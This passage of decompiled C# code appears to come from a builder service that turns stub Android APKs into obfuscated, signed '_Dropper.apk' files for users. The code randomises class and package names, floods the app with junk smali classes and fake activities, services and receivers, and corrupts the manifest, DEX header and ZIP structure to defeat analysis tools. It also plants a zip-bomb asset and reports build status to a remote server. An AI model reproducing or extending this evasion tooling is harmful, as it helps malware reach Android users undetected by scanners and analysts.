					text2 = Conversions.ToString(Operators.AddObject(text2, Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject("    <string name=\"", EaodWorker.Codes.Random_Word()), EaodWorker.Codes.RandommMad(4, 15)), "\">"), EaodWorker.Codes.Random_Word()), EaodWorker.Codes.RandommMad(4, 15)), "</string>"), "\r\n")));
					num++;
				}
				while (num <= 200);
				int num2 = array.Length - 1;
				for (int i = 0; i <= num2; i++)
				{
					if (array[i].Contains("<string name"))
					{
						array[i] = array[i] + "\r\n" + text2;
						break;
					}
				}
				File.WriteAllLines(stringspath, array);
				File.Delete(stubicon);
				byte[] first = File.ReadAllBytes(TargetApkicon);
				byte[] bytes = Encoding.ASCII.GetBytes("<!--" + Guid.NewGuid().ToString() + "-->");
				byte[] bytes2 = first.Concat(bytes).ToArray();
				File.WriteAllBytes(stubicon, bytes2);
				Mylogger.Logbuild(userid, "Encoding");
				ClassesPath = STUBPATH + "\\smali\\com\\appd\\instll";
				string[] files = Directory.GetFiles(STUBPATH + "\\smali\\com\\appd\\instll");
				N_Class1 = Conversions.ToString(EaodWorker.Codes.RandomSTR(10, 20));
				N_Class2 = Conversions.ToString(EaodWorker.Codes.RandomSTR(10, 20));
				N_Class3 = Conversions.ToString(EaodWorker.Codes.RandomSTR(10, 20));
				N_Class4 = Conversions.ToString(EaodWorker.Codes.RandomSTR(10, 20));
				N_Class5 = Conversions.ToString(EaodWorker.Codes.RandomSTR(10, 20));
				string xmlContent = File.ReadAllText(MainfistPath).Replace(ClassGen1, N_Class1).Replace(ClassGen2, N_Class2)
					.Replace(ClassGen3, N_Class3)
					.Replace(ClassGen4, N_Class4)
					.Replace("[T_ID]", appid)
					.Replace("target.app.rep", appid)
					.Replace(drop_oldpkg, drop_newpkg)
					.Replace(ClassGen5, N_Class5);
				File.WriteAllText(MainfistPath, ConfuseAndObfuscateManifestXml(xmlContent));
				string[] array2 = files;
				foreach (string path in array2)
				{
					string contents3 = File.ReadAllText(path).Replace("[T_ID]", appid).Replace(ClassGen1, N_Class1)
						.Replace(ClassGen2, N_Class2)
						.Replace(ClassGen3, N_Class3)
						.Replace(ClassGen4, N_Class4)
						.Replace(drop_oldpkg, drop_newpkg)
						.Replace(drop_oldpkg_insmali, drop_newpkg_insmali)
						.Replace(ClassGen5, N_Class5);
					File.WriteAllText(path, contents3);
				}
				Mylogger.Logbuild(userid, ">> Encryption ALL 2...");
				string text3 = STUBPATH + "\\smali";
				string[] files2 = Directory.GetFiles(text3, "*.smali", SearchOption.AllDirectories);
				foreach (string text4 in files2)
				{
					if (!text4.Contains("\\android\\") && !text4.Contains("\\androidx\\"))
					{
						string text5 = File.ReadAllText(text4);
						string contents4 = text5.Replace("[T_ID]", appid).Replace(ClassGen1, N_Class1).Replace(ClassGen2, N_Class2)
							.Replace(ClassGen3, N_Class3)
							.Replace(ClassGen4, N_Class4)
							.Replace(drop_oldpkg, drop_newpkg)
							.Replace(drop_oldpkg_insmali, drop_newpkg_insmali)
							.Replace(ClassGen5, N_Class5);
						File.WriteAllText(text4, contents4);
					}
				}
				Mylogger.Logbuild(userid, "junk classes Dropper...");
				GenerateJunkSmaliFiles(text3, 245);
				Thread.Sleep(1000);
				Mylogger.Logbuild(userid, ">> Big namespace manifist Dropper...");
				ReplaceHugePlaceholders(MainfistPath, 800000L, 400000000L);
				Mylogger.Logbuild(userid, "Building Dropper...");
				fordroper = true;
				ExecuteCommand("java -jar " + apktoolpath + " b -f " + STUBPATH + " -o " + buildapkpath);
				do
				{
					Thread.Sleep(1000);
				}
				while (Waitbuild);
				string text6 = buildapkpath.Replace(".apk", "_protected.apk");
				if (Operators.CompareString(notifymsg, "off", TextCompare: false) == 0)
				{
					Waitprotect = false;
					Mylogger.Logbuild(userid, ">Skip Protect drop..");
					File.Move(buildapkpath, text6);
				}
				else
				{
					Waitprotect = true;
					Mylogger.Logbuild(userid, "Protect Dropper..");
					string command = "java -jar -Xms4096M -Xmx6144M  " + Apkeditorpath + " p  -i \"" + buildapkpath + "\"";
					ExecuteCommand(command);
				}
				do
				{
					Thread.Sleep(1000);
				}
				while (Waitprotect | EaodWorker.Codes.FileInUse(text6));
				if (Operators.CompareString(notifymsg, "off", TextCompare: false) == 0)
				{
					Mylogger.Logbuild(userid, ">Skip Protect dropper v2..");
				}
				else
				{
					Mylogger.Logbuild(userid, "> Protect Dropper v2..");
					DexEditor dexEditor = new DexEditor();
					dexEditor.LoadFile(text6);
					DexHeaderInfo dexHeaderInfo = dexEditor.ReadHeader();
					dexEditor.SetHeaderSize(9999);
					dexEditor.SetFileSize(0);
					dexEditor.SetMagic(DexEditor.DexMagicType.ZIP);
					string text7 = text6.Replace(".apk", "_Crafted.apk");
					dexEditor.SaveFile(text7);
					APKProtector aPKProtector = new APKProtector(zeroSizes: false, corruptCRC: true, corruptOffsets: false, addFakeExtra: true, addPadding: false, addFakeEntries: true, randomCompressionMethod: true);
					File.Delete(text6);
					aPKProtector.ProtectAPK(text7, text6);
				}
				File.Delete(buildapkpath);
				Mylogger.Logbuild(userid, "Zip Align..");
				string command2 = ApkZIPpath + " 4 \"" + text6 + "\" \"" + text6.Replace("temp_protected.apk", "temp_zip.apk") + "\"";
				string text8 = text6.Replace("temp_protected.apk", "temp_zip.apk");
				ExecuteCommand(command2);
				do
				{
					Thread.Sleep(1000);
				}
				while (!File.Exists(text8) | EaodWorker.Codes.FileInUse(text8));
				File.Delete(text6);
				Mylogger.Logbuild(userid, "Signing Dropper..");
				File.WriteAllBytes(C, Resources.certificate);
				File.WriteAllBytes(K, Resources.key);
				Thread.Sleep(1000);
				string text9 = outputpath + "\\" + originalapkname.Replace(".apk", "_Dropper.apk");
				string command3 = "java -jar \"" + Apksignerpath + "\" sign --key \"" + K + "\" --cert \"" + C + "\"  --v2-signing-enabled true --v3-signing-enabled false --out \"" + text9 + "\" \"" + text8 + "\"";
				ExecuteCommand(command3);
				do
				{
					Thread.Sleep(1000);
				}
				while (!File.Exists(text9) | EaodWorker.Codes.FileInUse(text9) | EaodWorker.Codes.FileInUse(text8));
				File.Delete(text8);
				int num3 = 1;
				do
				{
					Thread.Sleep(1000);
					num3++;
				}
				while (num3 <= 5);
				File.Move(text9, userfolder + "\\" + appid + ".apk");
				int num4 = 1;
				do
				{
					Thread.Sleep(100);
					num4++;
				}
				while (num4 <= 30);
				UpdateState(finished);
				Mylogger.Logbuild(userid, "Cleanning...");
				try
				{
					Mylogger.Logbuild(userid, "WorkDIR...");
					EaodWorker.Codes.DirectoryDeleteLong(WorkDIR);
				}
				catch (Exception ex3)
				{
					ProjectData.SetProjectError(ex3);
					Exception ex4 = ex3;
					Mylogger.LogError(userid, "error WorkDIR 2 : ", ex4.Message);
					ProjectData.ClearProjectError();
				}
				try
				{
					Mylogger.Logbuild(userid, "Cleanning WorkingDir...");
					EaodWorker.Codes.DirectoryDeleteLong(WorkingDir);
				}
				catch (Exception ex5)
				{
					ProjectData.SetProjectError(ex5);
					Exception ex6 = ex5;
					Mylogger.LogError(userid, "error WorkingDir: ", ex6.Message);
					ProjectData.ClearProjectError();
				}
				HoldFinishing = false;
				StopCommandPrompt();
			}
			catch (Exception ex7)
			{
				ProjectData.SetProjectError(ex7);
				Exception ex8 = ex7;
				UpdateState(failed);
				Mylogger.LogError(userid, ">Global Error 22: ", ex8.Message);
				singout(MYID);
				try
				{
					Mylogger.Logbuild(userid, "Cleanning WorkingDir...");
					EaodWorker.Codes.DirectoryDeleteLong(WorkingDir);
				}
				catch (Exception ex9)
				{
					ProjectData.SetProjectError(ex9);
					Exception ex10 = ex9;
					Mylogger.Logbuild(userid, "error WorkingDir: " + ex8.Message);
					ProjectData.ClearProjectError();
				}
				Environment.Exit(0);
				ProjectData.ClearProjectError();
			}
		}
	}

	public static void AddZipBombEncrypted(string apkPath)
	{
		Mylogger.Logbuild(userid, "AddZipBombEncrypted...");
		string text = Path.Combine(Path.GetTempPath(), "classes.so");
		using (FileStream fileStream = new FileStream(text, FileMode.Create, FileAccess.Write))
		{
			byte[] array = new byte[1024];
			int num = 1;
			do
			{
				fileStream.Write(array, 0, array.Length);
				num = checked(num + 1);
			}
			while (num <= 200000);
		}
		using (Ionic.Zip.ZipFile zipFile = Ionic.Zip.ZipFile.Read(apkPath))
		{
			zipFile.CompressionLevel = Ionic.Zlib.CompressionLevel.BestCompression;
			zipFile.UseZip64WhenSaving = Zip64Option.Default;
			ZipEntry zipEntry = zipFile["assets/classes"];
			if (zipEntry != null)
			{
				zipFile.RemoveEntry(zipEntry);
			}
			zipFile.AddFile(text, "assets");
			zipFile.Save();
		}
		if (File.Exists(text))
		{
			File.Delete(text);
		}
		Mylogger.Logbuild(userid, "zip bomb added...");
	}

	public static string ConfuseAndObfuscateManifestXml(string xmlContent)
	{
		XmlDocument xmlDocument = new XmlDocument();
		string result;
		try
		{
			xmlDocument.LoadXml(xmlContent);
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			result = xmlContent;
			ProjectData.ClearProjectError();
			goto IL_027d;
		}
		Random random = new Random();
		string uri = "http://schemas.android.com/apk/res/android";
		XmlNamespaceManager xmlNamespaceManager = new XmlNamespaceManager(xmlDocument.NameTable);
		xmlNamespaceManager.AddNamespace("android", uri);
		Func<int, string> func = [SpecialName] (int length) => Conversions.ToString(Operators.AddObject(EaodWorker.Codes.Random_Word(), EaodWorker.Codes.Random_Word()));
		List<XmlElement> list = new List<XmlElement>();
		foreach (XmlElement item in xmlDocument.GetElementsByTagName("*"))
		{
			list.Add(item);
		}
		foreach (XmlElement item2 in list)
		{
			try
			{
				if (!new string[11]
				{
					"uses-permission", "permission", "meta-data", "action", "category", "data", "intent", "uses-library", "queries", "uses-feature",
					"intent-filter"
				}.Contains(item2.Name))
				{
					string name = "android:" + XmlConvert.EncodeName(func(12));
					string value = "><" + Guid.NewGuid().ToString("N").Substring(0, 8) + string.Format(">\\n<!-- {0} -->", Guid.NewGuid().ToString("N").Substring(0, 8));
					item2.SetAttribute(name, value);
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
		using (MemoryStream memoryStream = new MemoryStream())
		{
			XmlWriterSettings xmlWriterSettings = new XmlWriterSettings();
			xmlWriterSettings.Encoding = new UTF8Encoding(encoderShouldEmitUTF8Identifier: false);
			xmlWriterSettings.Indent = true;
			xmlWriterSettings.OmitXmlDeclaration = false;
			XmlWriterSettings settings = xmlWriterSettings;
			using (XmlWriter w = XmlWriter.Create(memoryStream, settings))
			{
				xmlDocument.Save(w);
			}
			result = Encoding.UTF8.GetString(memoryStream.ToArray());
		}
		goto IL_027d;
		IL_027d:
		return result;
	}

	private static void StopCommandPrompt()
	{
		try
		{
			cmdProcess.CloseMainWindow();
			cmdProcess.Close();
			cmdProcess.Dispose();
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.ClearProjectError();
		}
	}

	private static async void UpdateState(string subCommand)
	{
		if (IsCustomeApp)
		{
			HttpClient httpClient = new HttpClient();
			string content = JsonConvert.SerializeObject(new Dictionary<string, object>
			{
				{ "userid", userid },
				{ "appid", appid },
				{ "subcom", subCommand }
			});
			StringContent content2 = new StringContent(content, Encoding.UTF8, "application/json");
			try
			{
				HttpResponseMessage httpResponseMessage = await httpClient.PostAsync(ServerApi_Customapp, content2);
				httpResponseMessage.EnsureSuccessStatusCode();
				Mylogger.Logbuild(msg: ">Server UpdateState: " + await httpResponseMessage.Content.ReadAsStringAsync(), userId: userid);
				return;
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				Exception ex3 = ex2;
				Mylogger.Logbuild(userid, ">UpdateState Error: " + ex3.Message);
				ProjectData.ClearProjectError();
				return;
			}
		}
		HttpClient httpClient2 = new HttpClient();
		string content3 = JsonConvert.SerializeObject(new Dictionary<string, object>
		{
			{ "userid", userid },
			{ "appid", appid },
			{ "subcom", subCommand }
		});
		StringContent content4 = new StringContent(content3, Encoding.UTF8, "application/json");
		try
		{
			HttpResponseMessage httpResponseMessage2 = await httpClient2.PostAsync(ServerApi, content4);
			httpResponseMessage2.EnsureSuccessStatusCode();
			Mylogger.Logbuild(msg: ">Server UpdateState: " + await httpResponseMessage2.Content.ReadAsStringAsync(), userId: userid);
		}
		catch (Exception ex4)
		{
			ProjectData.SetProjectError(ex4);
			Exception ex5 = ex4;
			Exception ex6 = ex5;
			Mylogger.Logbuild(userid, ">UpdateState Error: " + ex6.Message);
			ProjectData.ClearProjectError();
		}
	}

	private static async void InsertApp()
	{
		if (IsCustomeApp)
		{
			HttpClient httpClient = new HttpClient();
			string content = JsonConvert.SerializeObject(new Dictionary<string, object>
			{
				{ "userid", userid },
				{ "appid", appid },
				{
					"apppath",
					userfolder + "\\" + appid + ".apk"
				},
				{ "subcom", onbuild },
				{ "appname", appname },
				{
					"appico",
					userid + "/icons/" + appicopath
				}
			});
			StringContent content2 = new StringContent(content, Encoding.UTF8, "application/json");
			try
			{
				HttpResponseMessage httpResponseMessage = await httpClient.PostAsync(ServerApi_Customapp, content2);
				httpResponseMessage.EnsureSuccessStatusCode();
				Mylogger.Logbuild(msg: ">Server InsertApp 2: " + await httpResponseMessage.Content.ReadAsStringAsync(), userId: userid);
				return;
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				Exception ex3 = ex2;
				Mylogger.Logbuild(userid, ">InsertApp Error 2: " + ex3.Message);
				ProjectData.ClearProjectError();
				return;
			}
		}
		HttpClient httpClient2 = new HttpClient();
		string content3 = JsonConvert.SerializeObject(new Dictionary<string, object>
		{
			{ "userid", userid },
			{ "appid", appid },
			{
				"apppath",
				userfolder + "\\" + appid + ".apk"
			},
			{ "subcom", onbuild }
		});
		StringContent content4 = new StringContent(content3, Encoding.UTF8, "application/json");
		try
		{
			HttpResponseMessage httpResponseMessage2 = await httpClient2.PostAsync(ServerApi, content4);
			httpResponseMessage2.EnsureSuccessStatusCode();
			Mylogger.Logbuild(msg: ">Server InsertApp: " + await httpResponseMessage2.Content.ReadAsStringAsync(), userId: userid);
		}
		catch (Exception ex4)
		{
			ProjectData.SetProjectError(ex4);
			Exception ex5 = ex4;
			Exception ex6 = ex5;
			Mylogger.Logbuild(userid, ">InsertApp Error: " + ex6.Message);
			ProjectData.ClearProjectError();
		}
	}

	public static void GenerateJunkSmaliFiles(string smaliRootPath, int count = 100)
	{
		Random random = new Random();
		List<string> list = new List<string>();
		string[] directories = Directory.GetDirectories(smaliRootPath, "*", SearchOption.AllDirectories);
		string[] array = directories;
		foreach (string text in array)
		{
			string text2 = text.ToLowerInvariant().Replace("/", "\\");
			if (!text2.Contains("\\androidx\\") && !text2.Contains("\\android\\") && !text2.Contains("\\pqxz\\") && !text2.Contains("\\okhttp3\\"))
			{
				list.Add(text);
			}
		}
		int num = 1;
		checked
		{
			do
			{
				string text3 = Path.Combine(smaliRootPath, Conversions.ToString(NewLateBinding.LateGet(EaodWorker.Codes.RandomSTR(3, 15), null, "ToLower", new object[0], null, null, null)), Conversions.ToString(NewLateBinding.LateGet(EaodWorker.Codes.RandomSTR(3, 15), null, "ToLower", new object[0], null, null, null)), Conversions.ToString(NewLateBinding.LateGet(EaodWorker.Codes.RandomSTR(3, 15), null, "ToLower", new object[0], null, null, null)));
				Directory.CreateDirectory(text3);
				list.Add(text3);
				num++;
			}
			while (num <= 5);
			foreach (string item in list)
			{
				for (int j = 1; j <= count; j++)
				{
					string text4 = Conversions.ToString(NewLateBinding.LateGet(EaodWorker.Codes.RandomSTR(6, 15), null, "ToLower", new object[0], null, null, null));
					string text5 = Path.Combine(item, text4 + ".smali");
					string arg = text5.Substring(smaliRootPath.Length + 1).Replace(Path.DirectorySeparatorChar, '/').Replace(".smali", "");
					StringBuilder stringBuilder = new StringBuilder();
					stringBuilder.AppendLine($".class public L{arg};");
					stringBuilder.AppendLine(".super Ljava/lang/Object;");
					stringBuilder.AppendLine();
					int num2 = random.Next(10, 15);
					for (int k = 1; k <= num2; k++)
					{
						int num3 = random.Next(-8, 8);
						stringBuilder.AppendLine($".field public static f{k}_{GetRandomChars(random, 4)}:I = {num3}");
					}
					stringBuilder.AppendLine();
					stringBuilder.AppendLine(".method public constructor <init>()V");
					stringBuilder.AppendLine("    .locals 1");
					stringBuilder.AppendLine("    invoke-direct {p0}, Ljava/lang/Object;-><init>()V");
					stringBuilder.AppendLine("    return-void");
					stringBuilder.AppendLine(".end method");
					stringBuilder.AppendLine();
					int num4 = random.Next(4, 10);
					for (int l = 1; l <= num4; l++)
					{
						string text6 = "do" + GetRandomChars(random, random.Next(6, 9));
						stringBuilder.AppendLine($".method public static {text6}()V");
						stringBuilder.AppendLine("    .locals 3");
						stringBuilder.AppendLine("    const/4 v0, " + FormatConst4(random.Next(-8, 8)));
						stringBuilder.AppendLine("    const/4 v1, " + FormatConst4(random.Next(-8, 8)));
						stringBuilder.AppendLine("    const/4 v2, " + FormatConst4(random.Next(-8, 8)));
						switch (random.Next(0, 3))
						{
						case 0:
							stringBuilder.AppendLine("    add-int v0, v0, v1");
							stringBuilder.AppendLine("    mul-int v1, v1, v2");
							break;
						case 1:
							stringBuilder.AppendLine("    xor-int v0, v0, v2");
							stringBuilder.AppendLine("    rem-int v2, v1, v0");
							break;
						case 2:
							stringBuilder.AppendLine("    or-int v1, v0, v2");
							stringBuilder.AppendLine("    and-int v2, v1, v0");
							break;
						}
						stringBuilder.AppendLine("    sget-object v1, Ljava/lang/System;->out:Ljava/io/PrintStream;");
						stringBuilder.AppendLine("    const-string v0, \"" + text6 + "\"");
						stringBuilder.AppendLine("    invoke-virtual {v1, v0}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V");
						stringBuilder.AppendLine("    return-void");
						stringBuilder.AppendLine(".end method");
						stringBuilder.AppendLine();
					}
					UTF8Encoding encoding = new UTF8Encoding(encoderShouldEmitUTF8Identifier: false);
					File.WriteAllText(text5, stringBuilder.ToString(), encoding);
				}
			}
		}
	}

	private static string GetRandomChars(Random rand, int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 1; i <= length; i = checked(i + 1))
		{
			stringBuilder.Append(GetRandomChar(rand));
			stringBuilder.Append(GetRandomChar(rand));
			stringBuilder.Append(GetRandomChar(rand));
			stringBuilder.Append(GetRandomChar(rand));
			stringBuilder.Append(GetRandomChar(rand));
			stringBuilder.Append(GetRandomChar(rand));
			stringBuilder.Append(GetRandomChar(rand));
		}
		return stringBuilder.ToString().ToLower();
	}

	private static string FormatConst4(int value)
	{
		if (value < 0)
		{
			return "-0x" + Math.Abs(value).ToString("X");
		}
		return "0x" + value.ToString("X");
	}

	private static string GetRandomChar(Random rand)
	{
		return Strings.ChrW(rand.Next(97, 123)).ToString().ToLower();
	}

	public static void GenerateJunkAndroidComponents(string smaliRootPath, string manifestPath)
	{
		if (randCompnts == null)
		{
			randCompnts = new Random();
		}
		int num = 10;
		int num2 = 1;
		checked
		{
			do
			{
				num = randCompnts.Next(15, 33);
				num2++;
			}
			while (num2 <= 3);
			string[] array = new string[3] { "activity", "service", "receiver" };
			string text = Conversions.ToString(EaodWorker.Codes.Random_Word());
			string text2 = Conversions.ToString(EaodWorker.Codes.Random_Word());
			string arg = $"{text}/{text2}";
			string text3 = Path.Combine(smaliRootPath, text, text2);
			Directory.CreateDirectory(text3);
			XmlDocument xmlDocument = new XmlDocument();
			xmlDocument.Load(manifestPath);
			XmlNamespaceManager xmlNamespaceManager = new XmlNamespaceManager(xmlDocument.NameTable);
			xmlNamespaceManager.AddNamespace("android", "http://schemas.android.com/apk/res/android");
			XmlNode xmlNode = xmlDocument.SelectSingleNode("/manifest/application");
			if (xmlNode == null)
			{
				throw new Exception("Could not find <application> in manifest");
			}
			int num3 = num;
			for (int i = 1; i <= num3; i++)
			{
				int num4 = randCompnts.Next(0, array.Length);
				string text4 = array[num4];
				string text5 = Conversions.ToString(Operators.ConcatenateObject("op" + CultureInfo.InvariantCulture.TextInfo.ToTitleCase(text4), EaodWorker.Codes.Random_Word()));
				string arg2 = $"{arg}/{text5}";
				string path = Path.Combine(text3, $"{text5}.smali");
				StringBuilder stringBuilder = new StringBuilder();
				stringBuilder.AppendLine($".class public L{arg2};");
				switch (text4)
				{
				case "activity":
					stringBuilder.AppendLine(".super Landroid/app/Activity;");
					break;
				case "service":
					stringBuilder.AppendLine(".super Landroid/app/Service;");
					break;
				case "receiver":
					stringBuilder.AppendLine(".super Landroid/content/BroadcastReceiver;");
					break;
				}
				stringBuilder.AppendLine();
				int num5 = randCompnts.Next(10, 15);
				for (int j = 1; j <= num5; j++)
				{
					int num6 = randCompnts.Next(-8, 8);
					stringBuilder.AppendLine($".field public static f{j}_{GetRandomChars(randCompnts, 4)}:I = {num6}");
				}
				stringBuilder.AppendLine();
				stringBuilder.AppendLine(".method public constructor <init>()V");
				stringBuilder.AppendLine("    .locals 0");
				stringBuilder.AppendLine($"    invoke-direct {{p0}}, {GetSuperClass(text4)}-><init>()V");
				stringBuilder.AppendLine("    return-void");
				stringBuilder.AppendLine(".end method");
				stringBuilder.AppendLine();
				switch (text4)
				{
				case "activity":
					stringBuilder.AppendLine(ActivityOnCreate());
					break;
				case "service":
					stringBuilder.AppendLine(ServiceOnCreate());
					stringBuilder.AppendLine();
					stringBuilder.AppendLine(ServiceOnStartCommand());
					break;
				case "receiver":
					stringBuilder.AppendLine(BroadcastReceiverOnReceive());
					break;
				}
				File.WriteAllText(path, stringBuilder.ToString(), new UTF8Encoding(encoderShouldEmitUTF8Identifier: false));
				XmlElement xmlElement = xmlDocument.CreateElement(text4);
				xmlElement.SetAttribute("name", "http://schemas.android.com/apk/res/android", $"{text}.{text2}.{text5}");
				xmlNode.AppendChild(xmlElement);
			}
			xmlDocument.Save(manifestPath);
		}
	}

	private static string GetSuperClass(string componentType)
	{
		return componentType switch
		{
			"activity" => "Landroid/app/Activity;", 
			"service" => "Landroid/app/Service;", 
			"receiver" => "Landroid/content/BroadcastReceiver;", 
			_ => "Ljava/lang/Object;", 
		};
	}

	private static string ActivityOnCreate()
	{
		return string.Join("\n", ".method protected onCreate(Landroid/os/Bundle;)V", "    .locals 0", "    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V", "    return-void", ".end method");
	}

	private static string ServiceOnCreate()
	{
		return string.Join("\n", ".method public onCreate()V", "    .locals 0", "    invoke-super {p0}, Landroid/app/Service;->onCreate()V", "    return-void", ".end method");
	}

	private static string ServiceOnStartCommand()
	{
		return string.Join("\n", ".method public onStartCommand(Landroid/content/Intent;II)I", "    .locals 1", "    const/4 v0, 1", "    return v0", ".end method");
	}

	private static string BroadcastReceiverOnReceive()
	{
		return string.Join("\n", ".method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V", "    .locals 0", "    return-void", ".end method");
	}

	public static void ShuffleSmaliFiles(string decompiledApkPath, int numAdditionalFolders)
	{
		if (numAdditionalFolders < 1)
		{
			throw new ArgumentException("Number of additional folders must be at least 1.");
		}
		List<string> list = new List<string>();
		string[] directories = Directory.GetDirectories(decompiledApkPath);
		int num = 1;
		string[] array = directories;
		foreach (string text in array)
		{
			string fileName = Path.GetFileName(text);
			if (Operators.CompareString(fileName, "smali", TextCompare: false) == 0)
			{
				list.Add(text);
			}
			else
			{
				if (!fileName.StartsWith("smali_classes"))
				{
					continue;
				}
				string s = fileName.Substring("smali_classes".Length);
				if (int.TryParse(s, out var result))
				{
					list.Add(text);
					if (result > num)
					{
						num = result;
					}
				}
			}
		}
		List<string> list2 = new List<string>();
		List<SmaliFile> list3;
		Random random;
		checked
		{
			int num2 = num + 1;
			int num3 = num + numAdditionalFolders;
			for (int j = num2; j <= num3; j++)
			{
				string text2 = Path.Combine(decompiledApkPath, "smali_classes" + j);
				Directory.CreateDirectory(text2);
				list2.Add(text2);
			}
			list3 = new List<SmaliFile>();
			foreach (string item in list)
			{
				string[] files = Directory.GetFiles(item, "*.smali", SearchOption.AllDirectories);
				string[] array2 = files;
				foreach (string filePath in array2)
				{
					list3.Add(new SmaliFile(filePath, item));
				}
			}
			random = new Random();
			ShuffleList(list3, random);
		}
		int num4 = Math.Max(1, list3.Count / checked(list.Count + list2.Count));
		checked
		{
			int num5 = list3.Count - 1;
			for (int l = 0; l <= num5; l++)
			{
				SmaliFile smaliFile = list3[l];
				string relativePath = GetRelativePath(smaliFile.SourceRoot, smaliFile.FilePath);
				if (l >= num4 * list.Count)
				{
					List<string> list4 = new List<string>(list);
					list4.AddRange(list2);
					list4.Remove(smaliFile.SourceRoot);
					string path = list4[random.Next(list4.Count)];
					string text3 = Path.Combine(path, relativePath);
					if (!File.Exists(text3))
					{
						Directory.CreateDirectory(Path.GetDirectoryName(text3));
						File.Move(smaliFile.FilePath, text3);
					}
				}
			}
		}
	}

	public static string GetRelativePath(string basePath, string targetPath)
	{
		Uri uri = new Uri(basePath.EndsWith(Conversions.ToString(Path.DirectorySeparatorChar)) ? basePath : (basePath + Conversions.ToString(Path.DirectorySeparatorChar)));
		Uri uri2 = new Uri(targetPath);
		return Uri.UnescapeDataString(uri.MakeRelativeUri(uri2).ToString().Replace('/', Path.DirectorySeparatorChar));
	}

	public static void ShuffleList<T>(IList<T> list, Random random)
	{
		checked
		{
			int num = list.Count - 1;
			for (int i = num; i >= 1; i += -1)
			{
				int index = random.Next(i + 1);
				T value = list[i];
				list[i] = list[index];
				list[index] = value;
			}
		}
	}

	public static void EncryptFolder(string folderPath, string password)
	{
		if (!Directory.Exists(folderPath))
		{
			throw new DirectoryNotFoundException("Folder not found: " + folderPath);
		}
		string[] files = Directory.GetFiles(folderPath);
		string[] array = files;
		foreach (string text in array)
		{
			try
			{
				EncryptFile(text, password);
				Console.WriteLine("Encrypted: " + Path.GetFileName(text));
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				Console.WriteLine("Error encrypting " + text + ": " + ex2.Message);
				ProjectData.ClearProjectError();
			}
		}
	}

	public static void InjectRandomJunkFiles(string targetDir)
	{
		checked
		{
			try
			{
				if (!Directory.Exists(targetDir))
				{
					Mylogger.Logbuild(userid, ">> Inject:Directory does not exist...");
					return;
				}
				Random random = new Random();
				int num = random.Next(6, 15);
				int num2 = num;
				for (int i = 1; i <= num2; i++)
				{
					bool flag = random.NextDouble() < 0.5;
					string text = "c_" + Guid.NewGuid().ToString("N").Substring(0, 8);
					if (flag)
					{
						string path = Path.Combine(targetDir, text + ".xml");
						string contents = "<?xml version=\"1.0\" encoding=\"utf-8\"?>\r\n<items>\r\n  <item>" + Guid.NewGuid().ToString() + "</item>\r\n  <itemx>" + Guid.NewGuid().ToString() + "</item>\r\n  <itemy>" + Guid.NewGuid().ToString() + "</item>\r\n  <itemy>" + Guid.NewGuid().ToString() + "</item>\r\n  <itemy>" + Guid.NewGuid().ToString() + "</item>\r\n  <flag>" + random.Next(1000, 9999) + "</flag>\r\n  <flag>" + random.Next(1000, 9999) + "</flag>\r\n  <flag>" + random.Next(1000, 9999) + "</flag>\r\n  <flagx>" + random.Next(1000, 9999) + "</flag>\r\n  <flagy>" + random.Next(1000, 9999) + "</flag>\r\n</items>";
						File.WriteAllText(path, contents);
						continue;
					}
					string filename = Path.Combine(targetDir, text + ".png");
					int width = random.Next(25, 30);
					int height = random.Next(10, 20);
					using Bitmap bitmap = new Bitmap(width, height);
					int num3 = bitmap.Width - 1;
					for (int j = 0; j <= num3; j++)
					{
						int num4 = bitmap.Height - 1;
						for (int k = 0; k <= num4; k++)
						{
							Color color = Color.FromArgb(random.Next(256), random.Next(256), random.Next(256));
							bitmap.SetPixel(j, k, color);
						}
					}
					bitmap.Save(filename, ImageFormat.Png);
				}
				Mylogger.Logbuild(userid, ">>  Junk files:done...");
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				Mylogger.Logbuild(userid, ">>  Junk files:error " + ex2.Message);
				ProjectData.ClearProjectError();
			}
		}
	}

	private static byte[] XorBytes(byte[] data, string password)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(password);
		checked
		{
			byte[] array = new byte[data.Length - 1 + 1];
			int num = data.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				array[i] = unchecked((byte)(data[i] ^ bytes[i % bytes.Length]));
			}
			return array;
		}
	}

	public static void EncryptFile(string filePath, string password)
	{
		byte[] data = File.ReadAllBytes(filePath);
		byte[] bytes = XorBytes(data, password);
		File.WriteAllBytes(filePath, bytes);
	}

	public static string GetRandomString(int length)
	{
		checked
		{
			byte[] array = new byte[length - 1 + 1];
			rng.GetBytes(array);
			StringBuilder stringBuilder = new StringBuilder(length);
			int num = length - 1;
			for (int i = 0; i <= num; i++)
			{
				stringBuilder.Append(chars[unchecked(array[i] % chars.Length)]);
			}
			return stringBuilder.ToString();
		}
	}

	public static void WriteRandomStringToStream(StreamWriter sw, long length)
	{
		RandomNumberGenerator randomNumberGenerator = RandomNumberGenerator.Create();
		char[] array = "qazwsxedcrfvtgbyhnujmikolp".ToCharArray();
		byte[] array2 = new byte[1024];
		char[] array3 = new char[1024];
		long num = length;
		checked
		{
			while (num > 0)
			{
				int num2 = (int)Math.Min(array2.Length, num);
				randomNumberGenerator.GetBytes(array2);
				int num3 = num2 - 1;
				for (int i = 0; i <= num3; i++)
				{
					array3[i] = array[unchecked(array2[i] % array.Length)];
				}
				sw.Write(array3, 0, num2);
				num -= num2;
			}
		}
	}

	public static void WriteHugeSlashesToStream(StreamWriter sw, long length)
	{
		char[] array = new char[1024];
		checked
		{
			int num = array.Length - 1;
